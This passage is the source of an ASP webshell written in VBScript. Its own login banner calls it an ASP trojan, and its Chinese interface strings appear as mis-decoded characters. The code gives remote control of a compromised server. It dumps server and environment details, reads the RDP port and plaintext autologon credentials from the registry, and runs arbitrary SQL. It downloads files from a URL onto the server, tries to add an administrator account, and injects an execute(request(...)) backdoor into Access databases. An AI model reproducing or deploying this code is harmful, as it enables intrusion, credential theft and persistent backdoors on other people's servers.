               alertThenClose("ÎÄ¼þ(¼Ð)É¾³ý³É¹¦,Ë¢ÐÂºó¾Í¿ÉÒÔ¿´µ½Ð§¹û!")
               Response.End
           End If

           echo "<style>body{margin:8;border:none;overflow:hidden;background-color:buttonface;}</style>"
           echo "<form method=post><br/>"
           echo HtmlEncode(thePath)
           echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
           echo "<input type=hidden name=theAct value=doDelOne>"
           echo "<hr/><input type=submit name=newAct value='È·ÈÏÉ¾³ý?'><input type=button value=' ¹Ø±Õ ' onclick='window.close();'>"
           echo "</form>"
       End Sub

       Sub fsoTheAttributes(thePath)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim newAct, theFile, theFolder, theTitle
           newAct = Request("newAct")

           If Right(thePath, 1) = "\" Then
               Set theFolder = fsoX.GetFolder(thePath)
               If newAct = " ÐÞ¸Ä " Then
                   setMyTitle(theFolder)
               End If
                   theTitle = getMyTitle(theFolder)
               Set theFolder = Nothing
            Else
               Set theFile = fsoX.GetFile(thePath)
               If newAct = " ÐÞ¸Ä " Then
                   setMyTitle(theFile)
               End If
               theTitle = getMyTitle(theFile)
               Set theFile = Nothing
           End If

           chkErr(Err)
           theTitle = Replace(theTitle, vbNewLine, "<br/>")
           echo "<style>body{margin:8;overflow:hidden;}</style>"
           echo "<form method=post>"
           echo "<input type=hidden name=thePath value=""" & HtmlEncode(thePath) & """>"
           echo "<input type=hidden name=theAct value=doModifyAttributes>"
           echo theTitle
           echo "<hr/><input type=submit name=newAct value=' ÐÞ¸Ä '>" & strJsCloseMe
           echo "</form>"
       End Sub

       Function getMyTitle(theOne)
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim strTitle
           strTitle = strTitle & "Â·¾¶: " & theOne.Path & "" & vbNewLine
           strTitle = strTitle & "´óÐ¡: " & getTheSize(theOne.Size) & vbNewLine
           strTitle = strTitle & "ÊôÐÔ: " & getAttributes(theOne.Attributes) & vbNewLine
           strTitle = strTitle & "´´½¨Ê±¼ä: " & theOne.DateCreated & vbNewLine
           strTitle = strTitle & "×îºóÐÞ¸Ä: " & theOne.DateLastModified & vbNewLine
           strTitle = strTitle & "×îºó·ÃÎÊ: " & theOne.DateLastAccessed
           getMyTitle = strTitle
       End Function

       Sub setMyTitle(theOne)
           Dim i, myAttributes

           For i = 1 To Request("attributes").Count
               myAttributes = myAttributes + CInt(Request("attributes")(i))
           Next
           theOne.Attributes = myAttributes

           chkErr(Err)
           echo  "<script>alert('¸ÃÎÄ¼þ(¼Ð)ÊôÐÔÒÑ°´ÕýÈ·ÉèÖÃÐÞ¸ÄÍê³É!');</script>"
       End Sub

       Function getAttributes(intValue)
           Dim strAtt
           strAtt = "<input type=checkbox name=attributes value=4 {$system}>ÏµÍ³ "
           strAtt = strAtt & "<input type=checkbox name=attributes value=2 {$hidden}>Òþ²Ø "
           strAtt = strAtt & "<input type=checkbox name=attributes value=1 {$readonly}>Ö»¶Á&nbsp;&nbsp;&nbsp;"
           strAtt = strAtt & "<input type=checkbox name=attributes value=32 {$archive}>´æµµ<br/>¡¡¡¡&nbsp; "
           strAtt = strAtt & "<input type=checkbox name=attributes {$normal} value=0>ÆÕÍ¨ "
           strAtt = strAtt & "<input type=checkbox name=attributes value=128 {$compressed}>Ñ¹Ëõ "
           strAtt = strAtt & "<input type=checkbox name=attributes value=16 {$directory}>ÎÄ¼þ¼Ð&nbsp;"
           strAtt = strAtt & "<input type=checkbox name=attributes value=64 {$alias}>¿ì½Ý·½Ê½"
   '       strAtt = strAtt & "<input type=checkbox name=attributes value=8 {$volume}>¾í±ê "
           If intValue = 0 Then
               strAtt = Replace(strAtt, "{$normal}", "checked")
           End If
           If intValue >= 128 Then
               intValue = intValue - 128
               strAtt = Replace(strAtt, "{$compressed}", "checked")
           End If
           If intValue >= 64 Then
               intValue = intValue - 64
               strAtt = Replace(strAtt, "{$alias}", "checked")
           End If
           If intValue >= 32 Then
               intValue = intValue - 32
               strAtt = Replace(strAtt, "{$archive}", "checked")
           End If
           If intValue >= 16 Then
               intValue = intValue - 16
               strAtt = Replace(strAtt, "{$directory}", "checked")
           End If
           If intValue >= 8 Then
               intValue = intValue - 8
               strAtt = Replace(strAtt, "{$volume}", "checked")
           End If
           If intValue >= 4 Then
               intValue = intValue - 4
               strAtt = Replace(strAtt, "{$system}", "checked")
           End If
           If intValue >= 2 Then
               intValue = intValue - 2
               strAtt = Replace(strAtt, "{$hidden}", "checked")
           End If
           If intValue >= 1 Then
               intValue = intValue - 1
               strAtt = Replace(strAtt, "{$readonly}", "checked")
           End If
           getAttributes = strAtt
       End Function

       Sub PageInfoAboutSrv()
           Dim theAct
           theAct = Request("theAct")

           showTitle("·þÎñÆ÷Ïà¹ØÊý¾Ý")

           Select Case theAct
               Case ""
                   getSrvInfo()
                   getSrvDrvInfo()
                   getSiteRootInfo()
                   getTerminalInfo()
               Case "getSrvInfo"
                   getSrvInfo()
               Case "getSrvDrvInfo"
                   getSrvDrvInfo()
               Case "getSiteRootInfo"
                   getSiteRootInfo()
               Case "getTerminalInfo"
                   getTerminalInfo()
           End Select

           echo "<hr/>Powered By Marcos 2005.02"
       End Sub

       Sub getSrvInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim i, sa, objWshSysEnv, aryExEnvList, strExEnvList, intCpuNum, strCpuInfo, strOS
           Set sa = Server.CreateObject("Shell.Application")
           strExEnvList = "SystemRoot$WinDir$ComSpec$TEMP$TMP$NUMBER_OF_PROCESSORS$OS$Os2LibPath$Path$PATHEXT$PROCESSOR_ARCHITECTURE$" & _
                          "PROCESSOR_IDENTIFIER$PROCESSOR_LEVEL$PROCESSOR_REVISION"
           aryExEnvList = Split(strExEnvList, "$")

           Set objWshSysEnv = wsX.Environment("SYSTEM")
           chkErr(Err)

           intCpuNum = Request.ServerVariables("NUMBER_OF_PROCESSORS")
           If IsNull(intCpuNum) Or intCpuNum = "" Then
               intCpuNum = objWshSysEnv("NUMBER_OF_PROCESSORS")
           End If
           strOS = Request.ServerVariables("OS")
           If IsNull(strOS) Or strOS = "" Then
               strOS = objWshSysEnv("OS")
               strOs = strOs & "(ÓÐ¿ÉÄÜÊÇ Windows2003 Å¶)"
           End If
           strCpuInfo = objWshSysEnv("PROCESSOR_IDENTIFIER")

           echo "<a href=javascript:showHideMe(srvInf);>·þÎñÆ÷Ïà¹Ø²ÎÊý:</a>"
           echo "<ol id=srvInf><hr/>"
           echo "<li>·þÎñÆ÷Ãû: " & Request.ServerVariables("SERVER_NAME") & "</li>"
           echo "<li>·þÎñÆ÷IP: " & Request.ServerVariables("LOCAL_ADDR") & "</li>"
           echo "<li>·þÎñ¶Ë¿Ú: " & Request.ServerVariables("SERVER_PORT") & "</li>"
           echo "<li>·þÎñÆ÷ÄÚ´æ: " & getTheSize(sa.GetSystemInformation("PhysicalMemoryInstalled")) & "</li>"
           echo "<li>·þÎñÆ÷Ê±¼ä: " & Now & "</li>"
           echo "<li>·þÎñÆ÷Èí¼þ: " & Request.ServerVariables("SERVER_SOFTWARE") & "</li>"
           echo "<li>½Å±¾³¬Ê±Ê±¼ä: " & Server.ScriptTimeout & "</li>"
           echo "<li>·þÎñÆ÷CPUÊýÁ¿: " & intCpuNum & "</li>"
           echo "<li>·þÎñÆ÷CPUÏêÇé: " & strCpuInfo & "</li>"
           echo "<li>·þÎñÆ÷²Ù×÷ÏµÍ³: " & strOS & "</li>"
           echo "<li>·þÎñÆ÷½âÒëÒýÇæ: " & ScriptEngine & "/" & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & "." & ScriptEngineBuildVersion & "</li>"
           echo "<li>±¾ÎÄ¼þÊµ¼ÊÂ·¾¶: " & Request.ServerVariables("PATH_TRANSLATED") & "</li>"
           echo "<hr/></ol>"

           echo "<br/><a href=javascript:showHideMe(srvEnvInf);>·þÎñÆ÷Ïà¹Ø²ÎÊý:</a>"
           echo "<ol id=srvEnvInf><hr/>"
           For i = 0 To UBound(aryExEnvList)
               echo "<li>" & aryExEnvList(i) & ": " & wsX.ExpandEnvironmentStrings("%" & aryExEnvList(i) & "%") & "</li>"
           Next
           echo "<hr/></ol>"

           Set sa = Nothing
           Set objWshSysEnv = Nothing
       End Sub

       Sub getSrvDrvInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim objTheDrive
           echo "<br/><a href=javascript:showHideMe(srvDriveInf);>·þÎñÆ÷´ÅÅÌÐÅÏ¢:</a>"
           echo "<ol id=srvDriveInf><hr/>"
           echo "<div id='fsoDriveList'>"
           echo "<span>ÅÌ·û</span><span>ÀàÐÍ</span><span>¾í±ê</span><span>ÎÄ¼þÏµÍ³</span><span>¿ÉÓÃ¿Õ¼ä</span><span>×Ü¿Õ¼ä</span><br/>"
           For Each objTheDrive In fsoX.Drives
               echo "<span>" & objTheDrive.DriveLetter & "</span>"
               echo "<span>" & getDriveType(objTheDrive.DriveType) & "</span>"
               If UCase(objTheDrive.DriveLetter) = "A" Then
                   echo "<br/>"
                Else
                   echo "<span>" & objTheDrive.VolumeName & "</span>"
                   echo "<span>" & objTheDrive.FileSystem & "</span>"
                   echo "<span>" & getTheSize(objTheDrive.FreeSpace) & "</span>"
                   echo "<span>" & getTheSize(objTheDrive.TotalSize) & "</span><br/>"
               End If
               If Err Then
                   Err.Clear
                   echo "<br/>"
               End If
           Next
           echo "</div><hr/></ol>"
           Set objTheDrive = Nothing
       End Sub

       Sub getSiteRootInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim objTheFolder
           Set objTheFolder = fsoX.GetFolder(Server.MapPath("/"))
           echo "<br/><a href=javascript:showHideMe(siteRootInfo);>Õ¾µã¸ùÄ¿Â¼ÐÅÏ¢:</a>"
           echo "<ol id=siteRootInfo><hr/>"
           echo "<li>ÎïÀíÂ·¾¶: " & Server.MapPath("/") & "</li>"
           echo "<li>µ±Ç°´óÐ¡: " & getTheSize(objTheFolder.Size) & "</li>"
           echo "<li>ÎÄ¼þÊý: " & objTheFolder.Files.Count & "</li>"
           echo "<li>ÎÄ¼þ¼ÐÊý: " & objTheFolder.SubFolders.Count & "</li>"
           echo "<li>´´½¨ÈÕÆÚ: " & objTheFolder.DateCreated & "</li>"
           echo "<li>×îºó·ÃÎÊÈÕÆÚ: " & objTheFolder.DateLastAccessed & "</li>"
           echo "</ol>"
       End Sub

       Sub getTerminalInfo()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim terminalPortPath, terminalPortKey, termPort
           Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
           Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword

           terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
           terminalPortKey = "PortNumber"
           termPort = wsX.RegRead(terminalPortPath & terminalPortKey)

           echo "ÖÕ¶Ë·þÎñ¶Ë¿Ú¼°×Ô¶¯µÇÂ¼ÐÅÏ¢<hr/><ol>"
           If termPort = "" Or Err.Number <> 0 Then
               echo  "ÎÞ·¨µÃµ½ÖÕ¶Ë·þÎñ¶Ë¿Ú, Çë¼ì²éÈ¨ÏÞÊÇ·ñÒÑ¾ÊÜµ½ÏÞÖÆ.<br/>"
            Else
               echo  "µ±Ç°ÖÕ¶Ë·þÎñ¶Ë¿Ú: " & termPort & "<br/>"
           End If

           autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
           autoLoginEnableKey = "AutoAdminLogon"
           autoLoginUserKey = "DefaultUserName"
           autoLoginPassKey = "DefaultPassword"
           isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
           If isAutoLoginEnable = 0 Then
               echo  "ÏµÍ³×Ô¶¯µÇÂ¼¹¦ÄÜÎ´¿ªÆô<br/>"
           Else
               autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
               echo  "×Ô¶¯µÇÂ¼µÄÏµÍ³ÕÊ»§: " & autoLoginUsername & "<br>"
               autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
               If Err Then
                   Err.Clear
                   echo  "False"
               End If
               echo  "×Ô¶¯µÇÂ¼µÄÕÊ»§ÃÜÂë: " & autoLoginPassword & "<br>"
           End If
           echo "</ol>"
       End Sub

       Sub PageLogin()
           Dim theAct, passWord
           theAct = Request("theAct")
           passWord = Request("userPassword")

           showTitle("¹ÜÀíµÇÂ¼")

           If theAct = "chkLogin" Then
               If passWord = userPassword Then
                   Session(m & "userPassword") = passWord
                   redirectTo("?pageName=PageList")
                Else
                   echo "<script language=javascript>alert('°¡Å¶,µÇÂ¼Ê§°ÜÁË...');history.back();</script>"
               End If
           End If

           echo "<style>body{margin:8;text-align:center;}</style>"
           echo "º£Ñô¶¥¶ËÍøASPÄ¾Âí@2006<hr/>"
           echo "<body onload=document.forms[0].userPassword.focus();>"
           echo "<form method=post onsubmit=this.Submit.disabled=true;>"
           echo "<input name=userPassword class=input type=password size=30> "
           echo "<input type=hidden name=theAct value=chkLogin>"
           echo "<input type=submit name=Submit value=""" & HtmlEncode(myName) & """ class=input>"
           echo "<hr/>"
           echo "±¾°æ¸ÐÐ»: Kevin,×¢²á±í¸÷¼üÖµµÄÊÕ¼¯¹¤×÷"
           echo "<br/>WWW.HAIYANGTOP.NET,WWW.HIDIDI.NET 2005.02"
           echo "</form>"
           echo "<body>"
       End Sub

       Sub pageMsDataBase()
           Dim theAct, sqlStr
           theAct = Request("theAct")
           sqlStr = Request("sqlStr")

           showTitle("mdb+mssqlÊý¾Ý¿â²Ù×÷Ò³")

           If sqlStr = "" Then
               If Session(m & "sqlStr") = "" Then
                   sqlStr = "e:\hytop.mdb»òsql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;"
                Else
                   sqlStr = Session(m & "sqlStr")
               End If
           End If
           Session(m & "sqlStr") = sqlStr

           echo "<style>body{margin:8;}</style>"
           echo "<form method=post action='?pageName=MsDataBase&theAct=showTables' onSubmit='this.Submit.disabled=true;'>"
           echo "<a href='?pageName=MsDataBase'>mdb+mssqlÊý¾Ý¿â²Ù×÷</a><br/>"
           echo "<input name=sqlStr type=text id=sqlStr value=""" & sqlStr & """ size=60 style='width:80%;'>"
           echo "<input name=theAct type=hidden value=showTables><br/>"
           echo "<input type=Submit name=Submit value=' Ìá½» '>"
           echo "<input type=button name=Submit2 value=' ²åÈë ' onclick=""if(confirm('ÕâÀïÊÇÔÚACESSÊý¾ÝÀï²åÈëº£Ñô¶¥¶ËÍøASPºóÃÅ\nÄ¬ÈÏÃÜÂëÊÇ" & clientPassword & "\nºóÃÅ²åÈëºó¿ÉÒÔÊ¹ÓÃµÄÇ°ÌáÊÇ\nÊý¾Ý¿âÊÇaspºó×º, ²¢ÇÒÃ»ÓÐ´íÂÒasp´úÂë\nÈ·ÈÏ²Ù×÷Âð?')){location.href='?pageName=MsDataBase&theAct=inject&sqlStr='+this.form.sqlStr.value;this.disabled=true;}"">"
           echo "<input type=button value=' Ê¾Àý ' onclick=""this.form.sqlStr.value='e:\\HYTop.mdb»òsql:Provider=SQLOLEDB.1;Server=localhost;User ID=sa;Password=haiyangtop;Database=bbs;';"">"
           echo "</form>"
           echo "<hr/>×¢: ²åÈëÖ»Õë¶ÔACCESS²Ù×÷, Òªä¯ÀÀACCESSÔÚ±íµ¥ÖÐµÄÐ´·¨ÊÇ""d:\bbs.mdb"", SQL¾Ý¿âÐ´·¨ÊÇ""sql:Á¬½Ó×Ö·û´®"", ²»ÒªÍüÐ´sql:¡£<hr/>"

           Select Case theAct
               Case "showTables"
                   showTables()
               Case "query"
                   showQuery()
               Case "inject"
                   accessInject()
           End Select

           echo "Powered By Marcos 2005.02"
       End Sub

       Sub showTables()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim conn, sqlStr, rsTable, rsColumn, connStr, tablesStr
           sqlStr = Request("sqlStr")
           If LCase(Left(sqlStr, 4)) = "sql:" Then
               connStr = Mid(sqlStr, 5)
            Else
               connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
           End If
           Set conn = Server.CreateObject("Adodb.Connection")

           conn.Open connStr
           chkErr(Err)

           tablesStr = getTableList(conn, sqlStr, rsTable)

           echo "<a href=""?pageName=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>Êý¾Ý¿â±í½á¹¹²é¿´:</a><br/>"
           echo tablesStr & "<hr/>"
           echo "<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>×ªµ½SQLÃüÁîÖ´ÐÐ</a><hr/>"

           Do Until rsTable.Eof
               Set rsColumn = conn.OpenSchema(4, Array(Empty, Empty, rsTable("Table_Name").value))
               echo "<table border=0 cellpadding=0 cellspacing=0><tr><td height=22 colspan=6><b>" & rsTable("Table_Name") & "</b></td>"
               echo "</tr><tr><td colspan=6><hr/></td></tr><tr align=center>"
               echo "<td>×Ö¶ÎÃû</td><td>ÀàÐÍ</td><td>´óÐ¡</td><td>¾«¶È</td><td>ÔÊÐíÎª¿Õ</td><td>Ä¬ÈÏÖµ</td></tr>"
               echo "<tr><td colspan=6><hr/></td></tr>"

               Do Until rsColumn.Eof
                   echo "<tr align=center>"
                   echo "<td align=Left>&nbsp;" & rsColumn("Column_Name") & "</td>"
                   echo "<td width=80>" & getDataType(rsColumn("Data_Type")) & "</td>"
                   echo "<td width=70>" & rsColumn("Character_Maximum_Length") & "</td>"
                   echo "<td width=70>" & rsColumn("Numeric_Precision") & "</td>"
                   echo "<td width=70>" & rsColumn("Is_Nullable") & "</td>"
                   echo "<td width=80>" & rsColumn("Column_Default") & "</td>"
                   echo "</tr>"
                   rsColumn.MoveNext
               Loop

               echo "<tr><td colspan=6><hr/></td></tr></table>"
               rsTable.MoveNext
           Loop

           echo "<hr/>"

           conn.Close
           Set conn = Nothing
           Set rsTable = Nothing
           Set rsColumn = Nothing
       End Sub

       Sub showQuery()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim i, j, rs, sql, page, conn, sqlStr, connStr, rsTable, tablesStr, theTable
           sql = Request("sql")
           page = Request("page")
           sqlStr = Request("sqlStr")
           theTable = Request("theTable")

           If Not IsNumeric(page) or page = "" Then
               page = 1
           End If

           If sql = "" And theTable <> "" Then
               sql = "Select top " & dbSelectNumber & " * from [" & theTable & "]"
           End If

           If LCase(Left(sqlStr, 4)) = "sql:" Then
               connStr = Mid(sqlStr, 5)
            Else
               connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
           End If
           Set rs = Server.CreateObject("Adodb.RecordSet")
           Set conn = Server.CreateObject("Adodb.Connection")

           conn.Open connStr
           chkErr(Err)

           tablesStr = getTableList(conn, sqlStr, rsTable)

           echo "<a href=""?pageName=MsDataBase&theAct=showTables&sqlStr=" & UrlEncode(sqlStr)  & """>Êý¾Ý¿â±í½á¹¹²é¿´:</a><br/>"
           echo tablesStr & "<hr/>"
           echo "<a href=?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & ">SQLÃüÁîÖ´ÐÐ¼°²é¿´</a>"
           echo "<br/><form method=post action=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & """>"
           echo "<input name=sql type=text id=sql value=""" & HtmlEncode(sql) & """ size=60>"
           echo "<input type=Submit name=Submit4 value=Ö´ÐÐ²éÑ¯><hr/>"

           If sql <> "" And Left(LCase(sql), 7) = "select " Then
               rs.Open sql, conn, 1, 1
               chkErr(Err)
               rs.PageSize = 20
               If Not rs.Eof Then
                   rs.AbsolutePage = page
               End If
               If rs.Fields.Count>0 Then
                   echo "<br><table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""98%"">"
                   echo "<tr>"
                   echo "<td height=""22"" align=""center"" class=""tr"" colspan=""" & rs.Fields.Count & """>SQL²Ù×÷ - Ö´ÐÐ½á¹û</td>"
                   echo "</tr>"
                   echo "<tr>"
                   For j = 0 To rs.Fields.Count-1
                       echo "<td height=""22"" align=""center"" class=""td""> " & rs.Fields(j).Name & " </td>"
                   Next
                   For i = 1 To 20
                       If rs.Eof Then
                           Exit For
                       End If
                       echo "</tr>"
                       echo "<tr valign=top>"
                       For j = 0 To rs.Fields.Count-1
                           echo "<td height=""22"" align=""center"">" & HtmlEncode(fixNull(rs(j))) & "</td>"
                       Next
                       echo "</tr>"
                       rs.MoveNext
                   Next
               End If
               echo "<tr>"
               echo "<td height=""22"" align=""center"" class=""td"" colspan=""" & rs.Fields.Count & """>"
               For i = 1 To rs.PageCount
                   echo Replace("<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&sql=" & UrlEncode(sql) & "&page=" & i & """><font {$font" & i & "}>" & i & "</font></a> ", "{$font" & page & "}", "class=warningColor")
               Next
               echo "</td></tr></table>"
               rs.Close
            Else
               If sql <> "" Then
                   conn.Execute(sql)
                   chkErr(Err)
                   echo "<center><br>Ö´ÐÐÍê±Ï!</center>"
               End If
           End If

           echo "</form><hr/>"

           conn.Close
           Set rs = Nothing
           Set conn = Nothing
           Set rsTable = Nothing
       End Sub

       Function getDataType(typeId)
           Select Case typeId
               Case 130
                   getDataType = "ÎÄ±¾"
               Case 2
                   getDataType = "ÕûÐÍ"
               Case 3
                   getDataType = "³¤ÕûÐÍ"
               Case 7
                   getDataType = "ÈÕÆÚ/Ê±¼ä"
               Case 5
                   getDataType = "Ë«¾«¶ÈÐÍ"
               Case 11
                   getDataType = "ÊÇ/·ñ"
               Case 128
                   getDataType = "OLE ¶ÔÏó"
               Case Else
                   getDataType = typeId
           End Select
       End Function

       Sub accessInject()
           If isDebugMode = False Then
               On Error Resume Next
           End If
           Dim rs, conn, sqlStr, connStr
           sqlStr = Request("sqlStr")
           If LCase(Left(sqlStr, 4)) = "sql:" Then
               showErr("²åÈëÖ»¶ÔACCESSÊý¾Ý¿âÓÐÐ§!")
            Else
               connStr = "Provider=Microsoft.Jet.Oledb.4.0;Data Source=" & sqlStr
           End If
           Set rs = Server.CreateObject("Adodb.RecordSet")
           Set conn = Server.CreateObject("Adodb.Connection")

           conn.Open connStr
           chkErr(Err)

           If notdownloadsExists = True Then
               conn.Execute("drop table notdownloads")
           End If

           conn.Execute("create table notdownloads(notdownloads oleobject)")

           rs.Open "notdownloads", conn, 1, 3
           rs.AddNew
           rs("notdownloads").AppendChunk(ChrB(Asc("<")) & ChrB(Asc("%")) & ChrB(Asc("e")) & ChrB(Asc("x")) & ChrB(Asc("e")) & ChrB(Asc("c")) & ChrB(Asc("u")) & ChrB(Asc("t")) & ChrB(Asc("e")) & ChrB(Asc("(")) & ChrB(Asc("r")) & ChrB(Asc("e")) & ChrB(Asc("q")) & ChrB(Asc("u")) & ChrB(Asc("e")) & ChrB(Asc("s")) & ChrB(Asc("t")) & ChrB(Asc("(")) & ChrB(Asc("""")) & ChrB(Asc(clientPassword)) & ChrB(Asc("""")) & ChrB(Asc(")")) & ChrB(Asc(")")) & ChrB(Asc("%")) & ChrB(Asc(">")) & ChrB(Asc(" ")))
           rs.Update
           rs.Close

           echo "<script language=""javascript"">alert('²åÈë³É¹¦!');history.back();</script>"

           conn.Close
           Set rs = Nothing
           Set conn = Nothing
       End Sub

       Function getTableList(conn, sqlStr, rsTable)
           Set rsTable = conn.OpenSchema(20, Array(Empty, Empty, Empty, "table"))

           Do Until rsTable.Eof
               getTableList = getTableList & "<a href=""?pageName=MsDataBase&theAct=query&sqlStr=" & UrlEncode(sqlStr) & "&theTable=" & UrlEncode(rsTable("Table_Name")) & """>[" & rsTable("Table_Name") & "]</a>&nbsp;"
               rsTable.MoveNext
           Loop
           rsTable.MoveFirst
       End Function

       Sub PageObjOnSrv()
           Dim i, objTmp, txtObjInfo, strObjectList, strDscList
           txtObjInfo = Trim(Request("txtObjInfo"))

           strObjectList = "MSWC.AdRotator,MSWC.BrowserType,MSWC.NextLink,MSWC.Tools,MSWC.Status,MSWC.Counters,IISSample.ContentRotator," & _
                           "IISSample.PageCounter,MSWC.PermissionChecker,Adodb.Connection,SoftArtisans.FileUp,SoftArtisans.FileManager,LyfUpload.UploadFile," & _
                           "Persits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Persits.MailSender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer," & _
                           "IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArtisans.ImageGen,W3Image.Image," & _
                           "Scripting.FileSystemObject,Adodb.Stream,Shell.Application,WScript.Shell,Wscript.Network"
           strDscList = "¹ã¸æÂÖ»»,ä¯ÀÀÆ÷ÐÅÏ¢,ÄÚÈÝÁ´½Ó¿â,,,¼ÆÊýÆ÷,ÄÚÈÝÂÖÏÔ,,È¨ÏÞ¼ì²â,ADO Êý¾Ý¶ÔÏó,SA-FileUp ÎÄ¼þÉÏ´«,SoftArtisans ÎÄ¼þ¹ÜÀí," & _
                        "ÁõÔÆ·åµÄÎÄ¼þÉÏ´«×é¼þ,ASPUpload ÎÄ¼þÉÏ´«,Dimac ÎÄ¼þÉÏ´«,Dimac JMail ÓÊ¼þÊÕ·¢,ÐéÄâ SMTP ·¢ÐÅ,ASPemail ·¢ÐÅ,ASPmail ·¢ÐÅ,dkQmail ·¢ÐÅ," & _
                        "Geocel ·¢ÐÅ,IISmail ·¢ÐÅ,SmtpMail ·¢ÐÅ,SA µÄÍ¼Ïñ¶ÁÐ´,Dimac µÄÍ¼Ïñ¶ÁÐ´×é¼þ," & _
                        "FSO,Stream Á÷,,,"

           aryObjectList = Split(strObjectList, ",")
           aryDscList = Split(strDscList, ",")

           showTitle("·þÎñÆ÷×é¼þÖ§³ÖÇé¿ö¼ì²â")

           echo "ÆäËû×é¼þÖ§³ÖÇé¿ö¼ì²â<br/>"
           echo "ÔÚÏÂÃæµÄÊäÈë¿òÖÐÊäÈëÄãÒª¼ì²âµÄ×é¼þµÄProgId»òClassId¡£<br/>"
           echo "<form method=post>"
           echo "<input name=txtObjInfo size=30 value=""" & txtObjInfo & """><input name=theAct type=submit value=ÎÒÒª¼ì²â>"
           echo "</form>"

           If Request("theAct") = "ÎÒÒª¼ì²â" And txtObjInfo <> "" Then
               Call getObjInfo(txtObjInfo, "")
           End If

           echo "<hr/>"
           echo "<lu>×é¼þÃû³Æ ©ª Ö§³Ö¼°ÆäËü"

           For i = 0 To UBound(aryDscList)
               Call getObjInfo(aryObjectList(i), aryDscList(i))
           Next

           echo "</lu><hr/>Powered By Marcos 2005.02"
       End Sub

       Sub getObjInfo(strObjInfo, strDscInfo)
           Dim objTmp

           If isDebugMode = False Then
               On Error Resume Next
           End If

           echo "<li> " & strObjInfo
           If strDscInfo <> "" Then
               echo " (" & strDscInfo & "×é¼þ)"
           End If

           echo " ©ª "

           Set objTmp = Server.CreateObject(strObjInfo)
           If Err <> -2147221005 Then
               echo "¡Ì "
               echo "Version: " & objTmp.Version & "; "
               echo "About: " & objTmp.About
            Else
               echo "¡Á"
           End If
           echo "</li>"

           If Err Then
               Err.Clear
           End If

           Set objTmp = Nothing
       End Sub

       Sub PageOtherTools()
           Dim theAct
           theAct = Request("theAct")

           showTitle("Ò»Ð©ÁãËéµÄÐ¡¶«Î÷")

           Select Case theAct
               Case "downFromUrl"
                   downFromUrl()
                   Response.End
               Case "addUser"
                   AddUser Request("userName"), Request("passWord")
                   Response.End
               Case "readReg"
                   readReg()
                   Response.End
           End Select

           echo "ÊýÖÆ×ª»»:<hr/>"
           echo "<input name=text1 value=×Ö·ûºÍÊý×Ö×ª10ºÍ16½øÖÆ size=25 id=text9>"
           echo "<input type=button onclick=main(); value=¸øÎÒ×ª>"
           echo "<input value=16½øÖÆ×ª10½øÖÆºÍ×Ö·û size=25 id=vars>"
           echo "<input type=button onClick=main2(); value=¸øÎÒ×ª>"
           echo "<hr/>"

           echo "ÏÂÔØµ½·þÎñÆ÷:<hr/>"
           echo "<form method=post target=_blank>"
           echo "<input name=theUrl value='http://' size=80><input type=submit value=' ÏÂÔØ '><br/>"
           echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
           echo "<input type=checkbox name=overWrite value=2>´æÔÚ¸²¸Ç"
           echo "<input type=hidden value=downFromUrl name=theAct>"
           echo "</form>"
           echo "<hr/>"

           echo "ÎÄ¼þ±à¼:<hr/>"
           echo "<form method=post action='?' target=_blank>"
           echo "<input size=80 name=thePath value=""" & HtmlEncode(Request.ServerVariables("PATH_TRANSLATED")) & """>"
           echo "<input type=hidden value=showEdit name=theAct>"
           echo "<select name=pageName><option value=AppFileExplorer>ÓÃStream</option><option value=FsoFileExplorer>ÓÃFSO</option></select>"
           echo "<input type=submit value=' ´ò¿ª '>"
           echo "</form><hr/>"

           echo "¹ÜÀíÕÊºÅÌí¼Ó(³É¹¦ÂÊ¼«µÍ):<hr/>"
           echo "<form method=post target=_blank>"
           echo "<input type=hidden value=addUser name=theAct>"
           echo "<input name=userName value='HYTop' size=39>"
           echo "<input name=passWord type=password value='HYTop' size=39>"
           echo "<input type=submit value=' Ìí¼Ó '>"
           echo "</form><hr/>"

           echo "×¢²á±í¼üÖµ¶ÁÈ¡(<a href=javascript:showHideMe(regeditInfo);>×ÊÁÏ</a>):<hr/>"
           echo "<form method=post target=_blank>"
           echo "<input type=hidden value=readReg name=theAct>"
           echo "<input name=thePath value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName' size=80>"
           echo "<input type=submit value=' ¶ÁÈ¡ '>"
           echo "<span id=regeditInfo style='display:none;'><hr/>"
